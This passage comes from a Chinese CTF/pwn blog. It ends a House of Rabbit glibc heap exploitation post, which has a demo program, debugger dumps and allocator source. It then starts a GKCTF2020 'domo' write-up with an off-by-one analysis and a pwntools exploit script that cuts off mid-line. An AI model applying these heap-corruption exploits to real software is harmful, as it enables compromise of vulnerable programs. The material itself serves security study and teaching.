class="line">    <span class="comment">/* 其实这里这样操作不是为了绕过检查,而是为了防止consolidate时报错 */</span></span><br><span class="line">	<span class="built_in">free</span>(chunk1);</span><br><span class="line">	chunk1[<span class="number">0</span>]=chunk2;</span><br><span class="line">	   </span><br><span class="line">	chunk3=<span class="built_in">malloc</span>(<span class="number">5000</span>);</span><br><span class="line">	chunk4=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	chunk3[<span class="number">0</span>]=<span class="string">&quot;chunk3&quot;</span>;</span><br><span class="line">	chunk4[<span class="number">0</span>]=<span class="string">&quot;chunk4&quot;</span>;	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>chunk3=malloc(5000) 执行前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x55555555b000</span> —▸ <span class="number">0x55555555b060</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line"><span class="comment">// 0x55555555b000: chunk1</span></span><br><span class="line"><span class="comment">// 0x55555555b060: chunk2 data(fake chunk1)</span></span><br></pre></td></tr></table></figure>
<p>强行令 chunk1-&gt;FD 指向 chunk2 data(fake chunk1)</p>
<p>chunk3=malloc(5000) 执行后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smallbins</span><br><span class="line">    <span class="comment">// fake chunk1-&gt;size:0x30</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x55555555b060</span> —▸ <span class="number">0x7ffff7dd1b98</span> (main_arena+<span class="number">120</span>) ◂— <span class="number">0x55555555b060</span> </span><br><span class="line">    <span class="comment">// chunk1-&gt;size:0x50</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x55555555b000</span> —▸ <span class="number">0x7ffff7dd1bb8</span> (main_arena+<span class="number">152</span>) ◂— <span class="number">0x55555555b000</span></span><br></pre></td></tr></table></figure>
<p>查看最终的 heap 排列：（“fake chunk1”将会作为“chunk4”被申请）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55555555b000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55555555b000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55555555b008</span> ◂— <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55555555b010</span> —▸ <span class="number">0x7ffff7dd1bb8</span> (main_arena+<span class="number">152</span>) —▸ <span class="number">0x7ffff7dd1ba8</span> (main_arena+<span class="number">136</span>) —▸ <span class="number">0x7ffff7dd1b98</span> (main_arena+<span class="number">120</span>) —▸ <span class="number">0x7ffff7dd1b88</span> (main_arena+<span class="number">104</span>) ◂— ...</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55555555b018</span> —▸ <span class="number">0x7ffff7dd1bb8</span> (main_arena+<span class="number">152</span>) —▸ <span class="number">0x7ffff7dd1ba8</span> (main_arena+<span class="number">136</span>) —▸ <span class="number">0x7ffff7dd1b98</span> (main_arena+<span class="number">120</span>) —▸ <span class="number">0x7ffff7dd1b88</span> (main_arena+<span class="number">104</span>) ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55555555b020</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│     <span class="number">0x55555555b040</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│     <span class="number">0x55555555b048</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│     <span class="number">0x55555555b050</span> ◂— <span class="number">0x50</span> <span class="comment">/* &#x27;P&#x27; */</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│     <span class="number">0x55555555b058</span> ◂— <span class="number">0x110</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│     <span class="number">0x55555555b060</span> —▸ <span class="number">0x55555555600b</span> ◂— <span class="number">0x6300326b6e756863</span> <span class="comment">/* &#x27;chunk2&#x27; */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│     <span class="number">0x55555555b068</span> ◂— <span class="number">0x31</span> <span class="comment">/* fake chunk1-&gt;size */</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│ rax <span class="number">0x55555555b070</span> —▸ <span class="number">0x555555556019</span> ◂— <span class="number">0x100346b6e756863</span> <span class="comment">/* &#x27;chunk4&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│     <span class="number">0x55555555b078</span> —▸ <span class="number">0x7ffff7dd1b98</span> (main_arena+<span class="number">120</span>) —▸ <span class="number">0x7ffff7dd1b88</span> (main_arena+<span class="number">104</span>) —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) —▸ <span class="number">0x55555555c4f0</span> ◂— ...</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x55555555b080</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x55555555b088</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x55555555b090</span> ◂— <span class="number">0x30</span> <span class="comment">/* &#x27;0&#x27; */</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0x55555555b098</span> ◂— <span class="number">0x21</span> <span class="comment">/* fake chunk2-&gt;size */</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│  <span class="number">0x55555555b0a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0x55555555b0b8</span> ◂— <span class="number">0x21</span> <span class="comment">/* fake chunk3-&gt;size */</span></span><br><span class="line">    ..........................</span><br><span class="line"><span class="number">2</span>d:<span class="number">0168</span>│  <span class="number">0x55555555b168</span> ◂— <span class="number">0x1391</span></span><br><span class="line"><span class="number">2</span>e:<span class="number">0170</span>│  <span class="number">0x55555555b170</span> —▸ <span class="number">0x555555556012</span> ◂— <span class="number">0x6300336b6e756863</span> <span class="comment">/* &#x27;chunk3&#x27; */</span></span><br><span class="line"><span class="number">2f</span>:<span class="number">0178</span>│  <span class="number">0x55555555b178</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>chunk2 和 chunk4（fake chunk1）明显重叠了</p>
<p><strong>利用条件：</strong></p>
<p>House Of Rabbit 功能很强大，但条件过多并且有替代选项：</p>
<ul>
<li>修改fastbin chunk的大小（感觉和unlink条件差不多，效果也差不多）<ul>
<li>堆溢出（有时off-by-one也利用），可以覆盖 nextchunk-&gt;size</li>
<li>可以申请足够大小的 chunk</li>
<li>可以控制 free 的参数</li>
</ul>
</li>
<li>修改FD指针（这种情况不用考虑，因为可以打 Double free，除非特殊情况）<ul>
<li>有修改模块，并且有UAF（可以修改 free chunk）</li>
<li>可以申请足够大小的 chunk</li>
<li>可以控制 free 的参数</li>
</ul>
</li>
</ul>
<h2 id="版本对-House-Of-Rabbit-的影响"><a href="#版本对-House-Of-Rabbit-的影响" class="headerlink" title="版本对 House Of Rabbit 的影响"></a>版本对 House Of Rabbit 的影响</h2><p>经测试：libc-2.23 ~ libc-2.31 都可以打通</p>
<p>最后挂一下 fastbin consolidate 的源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">    then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">    placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">    until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">    reused anyway.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">  fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index (chunksize (p));</span><br><span class="line">	  <span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)</span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	check_inuse_chunk(av, p);</span><br><span class="line">	nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">	size = chunksize (p);</span><br><span class="line">	nextchunk = chunk_at_offset(p, size);</span><br><span class="line">	nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">	  prevsize = prev_size (p);</span><br><span class="line">	  size += prevsize;</span><br><span class="line">	  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">	  unlink(av, p, bck, fwd);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">	  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">	    size += nextsize;</span><br><span class="line">	    unlink(av, nextchunk, bck, fwd);</span><br><span class="line">	  &#125; <span class="keyword">else</span></span><br><span class="line">	    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	  first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">	  unsorted_bin-&gt;fd = p;</span><br><span class="line">	  first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">	    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	  set_head(p, size | PREV_INUSE);</span><br><span class="line">	  p-&gt;bk = unsorted_bin;</span><br><span class="line">	  p-&gt;fd = first_unsorted;</span><br><span class="line">	  set_foot(p, size);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	  size += nextsize;</span><br><span class="line">	  set_head(p, size | PREV_INUSE);</span><br><span class="line">	  av-&gt;top = p;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​        // 反正我没有看出来哪里会导致 consolidate 报错，以后慢慢看把</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/11/Unlink%E6%94%BB%E5%87%BB+fastbin%20attack+vtable%E5%8A%AB%E6%8C%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/11/Unlink%E6%94%BB%E5%87%BB+fastbin%20attack+vtable%E5%8A%AB%E6%8C%81/" class="post-title-link" itemprop="url">Unlink攻击+fastbin attack+vtable劫持</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-11 23:44:28" itemprop="dateCreated datePublished" datetime="2022-03-11T23:44:28+08:00">2022-03-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-03-17 00:15:06" itemprop="dateModified" datetime="2022-03-17T00:15:06+08:00">2022-03-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>gkctf2020 domo 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Welcome to GKCTF</span><br><span class="line"><span class="number">1</span>: Add a user</span><br><span class="line"><span class="number">2</span>: Delete a user</span><br><span class="line"><span class="number">3</span>: Show a user</span><br><span class="line"><span class="number">4</span>: Edit a user</span><br><span class="line"><span class="number">5</span>: Exit</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">domo: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=b8ef84fe110e5098832857f8a42e28fb72b4ff26, stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/ywhkkx/桌面/domo&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<p>程序是给了 libc.so ，可以查看版本：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/tool/LibcSearcher/libc-database] git:(master) ./find __libc_start_main <span class="number">740</span></span><br><span class="line">ubuntu-glibc (libc6_2<span class="number">.23</span><span class="number">-0u</span>buntu3_amd64)</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( size &gt;= <span class="number">0</span> &amp;&amp; size &lt;= <span class="number">288</span> )</span><br><span class="line">&#123;</span><br><span class="line">  *((_QWORD *)&amp;chunk_list + index) = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *((<span class="keyword">void</span> **)&amp;chunk_list + index), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  *(_BYTE *)(*((_QWORD *)&amp;chunk_list + index) + size) = <span class="number">0</span>;<span class="comment">// off-by-one</span></span><br><span class="line">  ++chunk_num[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经典 off-by-one </p>
<p><strong>入侵思路</strong></p>
<p>程序ban了 hook，开了 Full RELRO，修改模块又没法正常使用（其实到这里的时候，我唯一想到的制胜手段就是 leak  Environ 获取栈地址，然后WAA返回地址进行 ret 劫持）</p>
<p>我自己尝试完成本题目时遇到了不小的麻烦，利用 unsortedbin 泄露了 libc_base，构造 fastbin 泄露了 head_addr ，但是我的构造方式很紊乱，导致之后的 unlink 完全没办法进行，所以我还是学习一下大佬的 exp 把：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.binary = <span class="string">&#x27;./domo&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./domo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./domo&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd_add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd_del</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd_show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">return</span> p.recv(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd_edit</span>(<span class="params">addr,num</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;addr:&#x27;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;num:&#x27;</span>,num)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">cmd_add(<span class="number">0x40</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 0(核心)</span></span><br><span class="line">cmd_add(<span class="number">0x60</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">cmd_add(<span class="number">0xf0</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">cmd_add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">offset = <span class="number">0x7ffff7bcdb78</span> - <span class="number">0x7ffff7bcdb0a</span></span><br><span class="line">cmd_del(<span class="number">2</span>)</span><br><span class="line">cmd_add(<span class="number">0xf0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_arena = u64(cmd_show(<span class="number">2</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) + offset</span><br><span class="line">offset = <span class="number">0x7f3d7a680b78</span> - <span class="number">0x7f3d7a2bc000</span></span><br><span class="line">libc.address = main_arena - offset</span><br><span class="line">success(<span class="string">&#x27;main_arena &gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap_addr</span></span><br><span class="line">cmd_add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 4</span></span><br><span class="line">cmd_del(<span class="number">3</span>)</span><br><span class="line">cmd_del(<span class="number">4</span>)</span><br><span class="line">cmd_add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">heap_addr = u64(cmd_show(<span class="number">3</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x10a</span> + <span class="number">0x10</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink for overlapping</span></span><br><span class="line">cmd_del(<span class="number">0</span>)</span><br><span class="line">cmd_add(<span class="number">0x40</span>,flat(<span class="number">0</span>,<span class="number">0xb1</span>,heap_addr+<span class="number">0x18</span>,heap_addr+<span class="number">0x20</span>,heap_addr+<span class="number">0x10</span>))</span><br><span class="line">cmd_del(<span class="number">1</span>)</span><br><span class="line">cmd_add(<span class="number">0x68</span>,flat(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x60</span>,<span class="number">0xb0</span>))</span><br><span class="line">cmd_del(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbins attack</span></span><br><span class="line">_IO_file_jumps = libc.sym[<span 